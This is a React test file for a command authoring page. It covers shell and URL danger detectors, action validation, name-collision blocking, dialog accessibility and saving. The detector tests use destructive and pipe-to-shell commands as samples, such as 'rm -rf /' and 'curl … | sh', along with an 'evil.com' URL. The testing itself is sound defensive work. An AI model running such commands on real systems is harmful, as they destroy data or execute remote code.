import React from "react";
import { render, screen, waitFor, within, fireEvent } from "@testing-library/react";
import { MemoryRouter, Routes, Route } from "react-router-dom";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import CommandAuthoringPage, {
  detectShellDanger,
  detectUrlDanger,
  collectDangerFlags,
  validateAction,
} from "./CommandAuthoringPage";
import { ToastProvider } from "../components/ToastProvider";

// --- Pure heuristic unit tests (no DOM) ---

describe("detectShellDanger", () => {
  test("flags rm -rf", () => {
    expect(detectShellDanger("rm -rf /tmp/x")).toMatch(/recursive|delete/i);
    expect(detectShellDanger("rm -fr ~/data")).toMatch(/delete/i);
  });
  test("flags curl|sh", () => {
    expect(detectShellDanger("curl https://x.sh | sh")).toMatch(/remote code/i);
    expect(detectShellDanger("wget -qO- http://x | bash")).toMatch(/remote code/i);
  });
  test("flags sudo", () => {
    expect(detectShellDanger("sudo apt-get install foo")).toMatch(/elevated/i);
  });
  test("passes benign commands", () => {
    expect(detectShellDanger("npm start")).toBeNull();
    expect(detectShellDanger("echo hello")).toBeNull();
    expect(detectShellDanger("")).toBeNull();
  });
});

describe("detectUrlDanger", () => {
  test("https passes", () => {
    expect(detectUrlDanger("https://example.com")).toBeNull();
  });
  test("http on localhost passes", () => {
    expect(detectUrlDanger("http://localhost:3000/x")).toBeNull();
    expect(detectUrlDanger("http://127.0.0.1:8000")).toBeNull();
  });
  test("http on remote host is flagged", () => {
    expect(detectUrlDanger("http://example.com")).toMatch(/insecure/i);
  });
  test("missing scheme is flagged", () => {
    expect(detectUrlDanger("example.com")).toMatch(/scheme/i);
  });
});

describe("validateAction", () => {
  test("keypress requires keys", () => {
    expect(validateAction({ type: "keypress" })).toMatch(/keys/i);
    expect(validateAction({ type: "keypress", keys: "ctrl+t" })).toBeNull();
  });
  test("shell accepts cmd or command", () => {
    expect(validateAction({ type: "shell", command: "ls" })).toBeNull();
    expect(validateAction({ type: "shell" })).toMatch(/command/i);
  });
});

describe("collectDangerFlags", () => {
  test("aggregates flagged shell + url actions with indexes", () => {
    const flags = collectDangerFlags([
      { type: "keypress", keys: "ctrl+t" },
      { type: "shell", cmd: "rm -rf /" },
      { type: "url", url: "http://evil.com" },
    ]);
    expect(flags.map((f) => f.index)).toEqual([1, 2]);
  });
});

// --- Component tests ---

const config = {
  commands: {
    existing_cmd: { name: "Existing", actions: [{ type: "keypress", keys: "ctrl+a" }] },
  },
};

function mockFetch() {
  return vi.fn((url: string, init?: RequestInit) => {
    if (url === "/api/v1/config" && (!init || init.method !== "PUT")) {
      return Promise.resolve({
        ok: true,
        json: () => Promise.resolve(config),
      } as Response);
    }
    if (url === "/api/v1/config" && init?.method === "PUT") {
      return Promise.resolve({ ok: true, json: () => Promise.resolve({}) } as Response);
    }
    return Promise.resolve({ ok: false, json: () => Promise.resolve({}) } as Response);
  });
}

function renderPage(initialEntries: string[] = ["/authoring"]) {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={client}>
      <ToastProvider>
        <MemoryRouter initialEntries={initialEntries}>
          <Routes>
            <Route path="/authoring" element={<CommandAuthoringPage />} />
            <Route path="/commands" element={<div>Commands List Page</div>} />
          </Routes>
        </MemoryRouter>
      </ToastProvider>
    </QueryClientProvider>
  );
}

beforeEach(() => {
  vi.stubGlobal("fetch", mockFetch());
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

async function fillManualForm(name: string) {
  fireEvent.click(screen.getByRole("tab", { name: /Manual Mode/i }));
  fireEvent.change(screen.getByLabelText(/Command Name/i), {
    target: { value: name },
  });
  fireEvent.change(screen.getByLabelText(/Display Name/i), {
    target: { value: "Display" },
  });
  fireEvent.change(screen.getByLabelText(/Wakeword/i), {
    target: { value: "trigger" },
  });
  fireEvent.click(screen.getByRole("button", { name: /Add Action/i }));
  fireEvent.change(screen.getByLabelText("Keys"), {
    target: { value: "ctrl+alt+t" },
  });
}

describe("collision warning", () => {
  test("blocks saving a command whose name already exists", async () => {
    renderPage();
    // Wait for existing names to load.
    await waitFor(() => expect(fetch).toHaveBeenCalledWith("/api/v1/config"));
    await fillManualForm("existing_cmd");

    fireEvent.click(screen.getByRole("button", { name: /Save Command/i }));

    expect(await screen.findByText(/already exists/i)).toBeInTheDocument();
    // Confirm modal must NOT have opened.
    expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
  });

  test("allows saving a uniquely named command", async () => {
    renderPage();
    await waitFor(() => expect(fetch).toHaveBeenCalledWith("/api/v1/config"));
    await fillManualForm("brand_new");

    fireEvent.click(screen.getByRole("button", { name: /Save Command/i }));

    expect(await screen.findByRole("dialog")).toBeInTheDocument();
    expect(screen.queryByText(/already exists/i)).not.toBeInTheDocument();
  });
});

describe("modal a11y", () => {
  test("Escape closes the dialog and it has dialog semantics", async () => {
    renderPage();
    await waitFor(() => expect(fetch).toHaveBeenCalledWith("/api/v1/config"));
    await fillManualForm("brand_new");
    fireEvent.click(screen.getByRole("button", { name: /Save Command/i }));

    const dialog = await screen.findByRole("dialog");
    expect(dialog).toHaveAttribute("aria-modal", "true");
    expect(dialog).toHaveAttribute("aria-labelledby");
    // Cancel button receives focus on open.
    const cancel = within(dialog).getByRole("button", { name: /^Cancel$/i });
    await waitFor(() => expect(cancel).toHaveFocus());

    fireEvent.keyDown(document, { key: "Escape" });
    await waitFor(() =>
      expect(screen.queryByRole("dialog")).not.toBeInTheDocument()
    );
  });
});

describe("danger warnings", () => {
  test("inline warning shown for rm -rf shell command", async () => {
    renderPage();
    await waitFor(() => expect(fetch).toHaveBeenCalledWith("/api/v1/config"));
    fireEvent.click(screen.getByRole("tab", { name: /Manual Mode/i }));
    fireEvent.click(screen.getByRole("button", { name: /Add Action/i }));
    // Switch the action to shell.
    fireEvent.change(screen.getByLabelText("Type"), {
      target: { value: "shell" },
    });
    fireEvent.change(screen.getByLabelText("Command"), {
      target: { value: "rm -rf /tmp/x" },
    });

    expect(await screen.findByText(/recursive|delete/i)).toBeInTheDocument();
  });
});

describe("success path", () => {
  test("navigates to /commands after a successful save", async () => {
    renderPage();
    await waitFor(() => expect(fetch).toHaveBeenCalledWith("/api/v1/config"));
    await fillManualForm("brand_new");
    fireEvent.click(screen.getByRole("button", { name: /Save Command/i }));

    const dialog = await screen.findByRole("dialog");
    fireEvent.click(within(dialog).getByRole("button", { name: /Confirm Save/i }));

    expect(await screen.findByText("Commands List Page")).toBeInTheDocument();
  });
});
